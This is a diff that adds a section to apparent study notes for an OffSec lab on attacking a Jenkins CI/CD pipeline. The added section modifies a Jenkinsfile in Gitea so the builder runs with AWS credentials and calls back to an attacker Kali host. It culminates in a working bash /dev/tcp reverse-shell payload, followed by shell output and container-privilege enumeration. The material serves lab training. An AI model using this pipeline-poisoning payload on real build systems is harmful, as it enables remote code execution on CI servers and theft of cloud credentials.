@@ -1187,9 +1187,178 @@ pipeline {
 - In Gitea, the webhooks can be found in the **Webhooks tab under Settings** [LINK of webhooks](http://git.offseclab.io/Jack/image-transform/settings/hooks/2).
 - Based on the settings, a Git Push will send a webhook to the automation server. Next, let's try to modify the Jenkinsfile to obtain a reverse shell from the builder.
 
-
-
-
+### Modifying the Pipeline
+- Before we edit the Jenkinsfile and push the change, we need to define our goal. We could edit the file to only exfiltrate the AWS keys, or we could obtain a full reverse shell. Let's try the reverse shell option, which allows us to further enumerate the builder and potentially discover additional sensitive data.
+- We'll have to make an assumption of the target operating system since we didn't find anything that indicated whether the builder was on Windows or Linux. Let's default to Linux and adjust to Windows if needed.
+- The syntax of the Jenkinsfile is a [domain-specific language](https://en.wikipedia.org/wiki/Domain-specific_language) (DSL) based on the [Groovy](https://groovy-lang.org/) language. This means we will need to write our reverse shell in the Jenkins DSL syntax. Let's write our payload in a text editor first, then push it to the repository later. We'll start with a basic pipeline definition.
+- Basic Pipeline
+```bash
+pipeline {
+  agent any
+  stages {
+    stage('Build') {
+      steps {
+        echo 'Building..'
+      }
+    }
+  }
+}
+```
+- We want to retain the AWS credentials from the original Jenkinsfile, so let's add that under the steps section.
+```bash
+pipeline {
+  agent any
+  stages {
+    stage('Build') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          echo 'Building..'
+        }
+      }
+    }
+  }
+}
+```
+- It's important to note that the withAWS function is not standard. Jenkins heavily relies on plugins to expand functionality. The withAWS function is a feature of the [AWS Steps plugin](https://plugins.jenkins.io/pipeline-aws/). While the AWS Steps plugin is popular, it's not included on every Jenkins install. However, since we know that this pipeline has already been using it, we can assume that it's installed.
+- Now when the echo runs, it will execute with the AWS credentials. Let's edit this to make it more useful. We'll start by adding a **script** block. While this isn't necessary, it allows us to expand the pipeline with more features (like checking which operating system is in use).
+```bash
+pipeline {
+  agent any
+  stages {
+    stage('Build') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            echo 'Building..'
+          }
+        }
+      }
+    }
+  }
+}
+```
+- Because Groovy can be used in this script section, our natural thought process might be to write the reverse shell in Groovy.
+- While Groovy can be used in this script section of the Jenkinsfile, it will execute the Groovy part of the script in a sandbox with very [limited access to internal APIs](https://www.jenkins.io/doc/book/managing/script-approval/). This means that we might be able to create new variables, but we won't be able to access internal APIs, which effectively prevents us from obtaining a shell. An administrator of Jenkins can approve scripts or enable auto-approval. With the information we have, there is no way of knowing if a Groovy script will execute, so it's best to avoid using a Groovy script as a reverse shell.
+- Instead, we can rely on other plugins to execute system commands. One plugin, called [Nodes and Processes](https://plugins.jenkins.io/workflow-durable-task-step/), allows developers to execute shell commands directly on the builder with the use of the sh step. While Nodes and Processes is a plugin, it is developed by Jenkins and is one of the most popular plugins installed on Jenkins. In addition to executing system commands, it also enables basic functionality, such as changing directories using dir. We can assume with high certainty that a Jenkins server has it installed.
+- Let's start by executing something fairly simple (like a curl) back to our Kali machine. We'll have to use the cloud Kali IP because our local machine likely does not have a public IP. This will let us more accurately determine if the script actually executed.
+```bash
+pipeline {
+  agent any
+  stages {
+    stage('Build') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            sh 'curl http://192.88.99.76/' # Cloud kali ip given by the lab
+          }
+        }
+      }
+    }
+  }
+}
+```
+- This current script will crash if it's executed on a Windows box. Let's modify it to only execute if we're running on a Unix-based system. We'll do this by adding an if statement under the script and using the isUnix function to verify the OS. We'll also change the curl command to confirm that we're running on a Unix system. This is very useful for debugging if something goes wrong.
+- Everything we're doing in this example does not require access to the internal Groovy APIs and won't require additional approval.
+```bash
+pipeline {
+  agent any
+  stages {
+    stage('Build') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh 'curl http://192.88.99.76/unix' # Cloud kali ip given by the lab
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+- Let's take a moment to test this code out. In a real-world scenario, we might hold off on running this to avoid triggering some kind of alert. However, in this case, we can execute the pipeline multiple times.
+- To test this, we first need to start Apache on Kali to capture the callback from curl and a listener to capture the reverse shell. Let's ssh into our cloud Kali machine using the password provided when the lab was started.
+- Next, we'll start apache2 by running sytemctl and the start verb to start the apache2 service.
+```bash
+ssh kali@<Kali-Cloud>
+sudo systemctl start apache2
+```
+- Next, we need to update the Jenkinsfile in the repo and trigger the pipeline to start. We could clone the repo and push it via the git command, but Gitea provides a simpler way to do this via the UI.
+- Let's return to the Jenkinsfile in the SCM server and click the Edit button.
+- The pipeline code that we have provided should execute fairly quickly. However, it will still take a few moments for the webhook to be executed and for Jenkins to initialize the environment. Shortly after we commit the Jenkinsfile, we can check the Apache logs in /var/log/apache2/access.log. We're searching for a hit on the /unix endpoint, which will confirm we can execute code and that we're running a Unix-based system.
+```bash
+cat /var/log/apache2/access.log # GOt request with 404
+# 54.157.240.196 - - [16/Dec/2024:04:40:33 +0000] "GET /unix HTTP/1.1" 404 436 "-" "curl/7.74.0"
+bash -i >& /dev/tcp/<Kali Cloud>/4242 0>&1
+# Git shell with uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins), sudo -l is not working
+```
+- Although this command may seem complex, we can break it down to better understand it. It's executing an interactive (-i) bash session, redirecting both stdout and stderr (>&) of that bash session to the Kali machine (/dev/tcp/192.88.99.76/4242) and also redirecting stdin from the network connection to the bash session. This effectively allows us to interact with the reverse shell.
+- While other reverse shells that use Perl and Python exist, we want to limit our reliance on additional languages that might not be installed on the target.
+- Before we add the reverse shell payload to the Jenkinsfile, we will wrap the whole thing in one more bash command. When dealing with redirects and pipes and reverse shells, it's always good to execute the payload in another bash session by using -c to specify the command to execute. For example: bash -c "PAYLOAD GOES HERE". This is because we aren't sure how the builder will execute the code or whether the redirections will work. However, if we wrap it in bash, we can ensure that it's executed in an environment where redirections will work. We'll also add an ampersand at the end to send the command to the process background, so execution doesn't stop because of a timeout.
+```bash
+pipeline {
+  agent any
+  stages {
+    stage('Send Reverse Shell') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh 'bash -c "bash -i >& /dev/tcp/<KALI CLOUD>/4242 0>&1" & '
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+- Response from the shell
+```powershell
+jenkins@5224aadecddc:~/agent/workspace/image-transform$ **whoami**
+whoami
+jenkins
+jenkins@5224aadecddc:~/agent/workspace/image-transform$ **hostname**
+hostname
+5224aadecddc
+jenkins@5224aadecddc:~/agent/workspace/image-transform$ **uname -a**
+uname -a
+Linux 5224aadecddc 4.14.311-233.529.amzn2.x86_64 #1 SMP Thu Mar 23 09:54:12 UTC 2023 x86_64 GNU/Linux
+jenkins@5224aadecddc:~/agent/workspace/image-transform$ **cat /etc/os-release**
+cat /etc/os-release
+PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
+NAME="Debian GNU/Linux"
+VERSION_ID="11"
+VERSION="11 (bullseye)"
+VERSION_CODENAME=bullseye
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+jenkins@5224aadecddc:~/agent/workspace/image-transform$ ifconfig
+```
+- Tried to check ssh folder and some processes
+```bash
+cd ~
+ls -la
+cd .ssh
+cat authorized_keys
+ifconfig, ip a # command not found
+```
+- Both ifconfig and ip are missing on the host. It's starting to seem like we are in a container, since we are limited by what we can run. Container enumeration is very similar to standard Linux enumeration. However, there are some additional things we should search for. For example, we should check the container for mounts that might contain secrets. We can list the mounts by reviewing the contents of /proc/mounts.
+```bash
+cat /proc/mounts
+```
+- The output confirms that this is indeed a Docker container. However, we don't find any additional mounts. We should also check whether this container carries a high level of privileges. Docker containers can run as "privileged", which gives the container a significant amount of permissions over the host. The "privileged" configuration for a container includes excess Linux capabilities, access to Linux devices, and more. We can determine if we're in this higher permission level by checking the contents of /proc/1/status and searching for Cap in the output.
+````bash
+jenkins@5224aadecddc:~/.ssh$ cat /proc/1/status | grep Cap
+cat /proc/1/status | grep Cap
+CapInh: 0000000000000000
+CapPrm: 0000003fffffffff
+CapEff: 0000003fffffffff
+CapBnd: 0000003fffffffff
+```
 
 # Special Thanks to the Creator of tools and Community
 [![](https://github.com/WithSecureLabs.png?size=50)](https://github.com/WithSecureLabs)
